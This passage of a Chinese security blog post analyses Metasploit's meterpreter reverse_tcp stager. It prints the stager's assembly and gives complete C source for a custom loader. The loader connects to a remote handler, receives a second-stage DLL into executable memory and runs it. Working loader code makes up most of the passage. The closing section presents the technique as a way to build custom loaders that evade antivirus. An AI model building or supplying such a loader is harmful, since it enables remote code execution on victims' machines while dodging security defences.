&apos;VirtualAlloc&apos;)&#125;</span><br><span class="line">        call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class="line">        ; Receive the second stage and execute it...</span><br><span class="line">        xchg ebx, eax           ; ebx = our new memory address for the new stage</span><br><span class="line">        push ebx                ; push the address of the new stage so we can return into it</span><br><span class="line">read_more:</span><br><span class="line">        push 0                  ; flags</span><br><span class="line">        push esi                ; length</span><br><span class="line">        push ebx                ; the current address into our second stage&apos;s RWX buffer</span><br><span class="line">        push edi                ; the saved socket</span><br><span class="line">        push #&#123;Rex::Text.block_api_hash(&apos;ws2_32.dll&apos;, &apos;recv&apos;)&#125;</span><br><span class="line">        call ebp                ; recv( s, buffer, length, 0 );</span><br><span class="line">.........省略无关代码</span><br><span class="line">read_successful:</span><br><span class="line">        add ebx, eax            ; buffer += bytes_received</span><br><span class="line">        sub esi, eax            ; length -= bytes_received, will set flags</span><br><span class="line">        jnz read_more           ; continue if we have more to read</span><br><span class="line">        ret                     ; return into the second stage</span><br></pre></td></tr></table></figure>
+<p>所以，用利用得到的信息，我们来构建loader</p>
+<p>模拟loader载荷程序reverse_tcp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* </span><br><span class="line">*初始化INIT socket</span><br><span class="line">*/</span><br><span class="line">void winsock_init() &#123;</span><br><span class="line">	WSADATA	wsaData;</span><br><span class="line">	if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) &lt; 0) &#123;</span><br><span class="line">		printf(&quot;ws2_32.dll is out of date.\n&quot;);</span><br><span class="line">		WSACleanup();</span><br><span class="line">		exit(1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>建立一个SOCK报错函数，如果报错，我们就关闭连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void punt(SOCKET my_socket, char * error) &#123;</span><br><span class="line">	printf(&quot;Sorry : %s\n&quot;, error);</span><br><span class="line">	closesocket(my_socket);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	exit(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>建立一个连接函数my_connect()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">/* 建立与主机的连接：端口*/</span><br><span class="line">SOCKET my_connect(char * targetip, int port) &#123;</span><br><span class="line">	struct hostent *	target;</span><br><span class="line">	struct sockaddr_in 	sock;</span><br><span class="line">	SOCKET 			my_socket;</span><br><span class="line"></span><br><span class="line">	/* 设置我们的套接字 */</span><br><span class="line">	my_socket = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	if (my_socket == INVALID_SOCKET)</span><br><span class="line">		punt(my_socket, &quot;[-] Could not initialize socket&quot;);</span><br><span class="line"></span><br><span class="line">	/* 我们的目标，获取主机名 */</span><br><span class="line">	target = gethostbyname(targetip);</span><br><span class="line">	if (target == NULL)</span><br><span class="line">		punt(my_socket, &quot;[-] Could not get target&quot;);</span><br><span class="line"></span><br><span class="line">	/* 创建sock信息，包括远程IP，PORT*/</span><br><span class="line">	memcpy(&amp;sock.sin_addr.s_addr, target-&gt;h_addr, target-&gt;h_length);</span><br><span class="line">	sock.sin_family = AF_INET;</span><br><span class="line">	sock.sin_port = htons(port);</span><br><span class="line"></span><br><span class="line">	/* 尝试连接 */</span><br><span class="line">	if ( connect(my_socket, (struct sockaddr *)&amp;sock, sizeof(sock)) )</span><br><span class="line">		punt(my_socket, &quot;[-] Could not connect to target&quot;);</span><br><span class="line"></span><br><span class="line">	return my_socket;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为，第一次不是获取DLL文件的，而是获取4字节缓冲区内存大小的，所以接收数据要分几次，一次是接收不完数据的，最好是创建一个专门的函数来接收。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/* 尝试从套接字接收所有请求的数据。 */</span><br><span class="line">int recv_all(SOCKET my_socket, void * buffer, int len) &#123;</span><br><span class="line">	int    tret   = 0;</span><br><span class="line">	int    nret   = 0;</span><br><span class="line">	void * startb = buffer;</span><br><span class="line">	while (tret &lt; len) &#123;</span><br><span class="line">		nret = recv(my_socket, (char *)startb, len - tret, 0);</span><br><span class="line">		startb += nret;</span><br><span class="line">		tret   += nret;</span><br><span class="line"></span><br><span class="line">		if (nret == SOCKET_ERROR)</span><br><span class="line">			punt(my_socket, &quot;Could not receive data&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return tret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面就是主函数了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">//主函数</span><br><span class="line">int main(int argc, char * argv[]) &#123;</span><br><span class="line">	ULONG32 size;</span><br><span class="line">	char * buffer;</span><br><span class="line">	//创建函数指针，方便XXOO</span><br><span class="line">	void (*function)();</span><br><span class="line">	winsock_init(); //套接字初始化</span><br><span class="line">	//获取参数，这里随便写，接不接收无所谓，主要是传递远程主机IP和端口</span><br><span class="line">	//这个可以事先定义好</span><br><span class="line">	if (argc != 3) &#123;</span><br><span class="line">		printf(&quot;%s [host] [port] ^__^ \n&quot;, argv[0]);</span><br><span class="line">		exit(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*连接到处理程序，也就是远程主机 */</span><br><span class="line">	SOCKET my_socket = my_connect(argv[1], atoi(argv[2]));</span><br><span class="line"></span><br><span class="line">	/* 读取4字节长度</span><br><span class="line">	*这里是meterpreter第一次发送过来的</span><br><span class="line">	*4字节缓冲区大小2E840D00，大小可能会有所不同,当然也可以自己丢弃，自己定义一个大小</span><br><span class="line">	*/</span><br><span class="line">	//是否报错</span><br><span class="line">	//如果第一次不是接收的4字节那么就退出程序</span><br><span class="line">	int count = recv(my_socket, (char *)&amp;size, 4, 0);</span><br><span class="line">	if (count != 4 || size &lt;= 0)</span><br><span class="line">		punt(my_socket, &quot;read length value Error\n&quot;);</span><br><span class="line"></span><br><span class="line">	/* 分配一个缓冲区 RWX buffer */</span><br><span class="line">	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	if (buffer == NULL)</span><br><span class="line">		punt(my_socket, &quot;could not alloc buffer\n&quot;);</span><br><span class="line"></span><br><span class="line">	/* </span><br><span class="line">	*SOCKET赋值到EDI寄存器，装载到buffer[]中</span><br><span class="line">	*/</span><br><span class="line">	//mov edi</span><br><span class="line">	buffer[0] = 0xBF;</span><br><span class="line"></span><br><span class="line">	/* 把我们的socket里的值复制到缓冲区中去*/</span><br><span class="line">	memcpy(buffer + 1, &amp;my_socket, 4);</span><br><span class="line"></span><br><span class="line">	/* 读取字节到缓冲区</span><br><span class="line">	*这里就循环接收DLL数据，直到接收完毕</span><br><span class="line">    */</span><br><span class="line">	count = recv_all(my_socket, buffer + 5, size);</span><br><span class="line"></span><br><span class="line">	/* 将缓冲区作为函数并调用它。</span><br><span class="line">	* 这里可以看作是shellcode的装载，</span><br><span class="line">	* 因为这本身是一个DLL装载器，完成使命，控制权交给DLL，</span><br><span class="line">	* 但本身不退出，除非迁移进程，靠DLL里函数，DLL在DLLMain里是循环接收指令的，直到遇到退出指令，</span><br><span class="line">	* (void (*)())buffer的这种用法经常出现在shellcode中</span><br><span class="line">	*/</span><br><span class="line">	function = (void (*)())buffer;</span><br><span class="line">	function();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行效果图</p>
+<p><img src="/allimage/meterload/5.jpg" alt="5"></p>
+<h3 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04  结语"></a>0x04  结语</h3><p>在对meterpreter的分析中，发现了很多特别的利用方式和shellcode编写方法。了解了执行原理，以至于我们可以自己来构造接收meterpreter的攻击载荷，修改其执行代码，达到免杀的效果；再者，我们可以自己特别定制任何载荷loader，不再使用meterpreter提供的载荷loader了。</p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html" target="_blank" rel="external">https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html</a></p>
+<p><a href="http://blog.csdn.net/gaara_fan/article/details/6528359" target="_blank" rel="external">http://blog.csdn.net/gaara_fan/article/details/6528359</a></p>
+<p><a href="http://www.docin.com/p-800847451.html" target="_blank" rel="external">http://www.docin.com/p-800847451.html</a></p>
+
+        </div>
+		<!--dashang-->
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/技术/">技术</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文内容仅作为作者个人兴趣与观点,若有不恰当之处，望不吝赐教</p>
+    
+    
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help" >帮助</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="友情链接">友情链接</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+        </p>
+        <p>
+            Blog by <a href="https://github.com/hucmosin" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+    </div>
+</footer>
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script src="/js/InsightSearch.js"></script>
+<script src="/js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '10/20/2017',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            wxMpImg: '/images/weixin-mp.png',
+        });
+    });
+</script>
+</body>
+</html>
